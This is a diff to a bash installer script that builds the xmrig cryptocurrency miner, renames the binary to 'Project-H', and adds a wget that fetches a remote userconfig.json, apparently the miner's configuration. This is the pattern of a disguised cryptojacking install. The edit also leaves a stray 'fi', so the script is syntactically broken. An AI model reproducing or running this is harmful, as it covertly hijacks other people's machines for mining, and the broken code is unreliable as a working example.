@@ -1,10 +1,6 @@
 #!/bin/bash
-if [ "$HOME" != "/root" ]; then
-   echo $(pwd) > home.file
-   export LOCAL= $(pwd)
-else
-   export LOCAL=$(cat $(find /home -name home.file))
-   cd $LOCAL
+export LOCAL=$(cat $(find /home -name home.file))
+cd $LOCAL
 fi
 if [ ! -e "AAA" ]; then
    sudo apt-get update
@@ -18,4 +14,5 @@ if [ ! -e "AAA" ]; then
    cmake ..
    make
    mv xmrig Project-H
+   wget https://raw.githubusercontent.com/U117A/scripts/master/userconfig.json
 fi
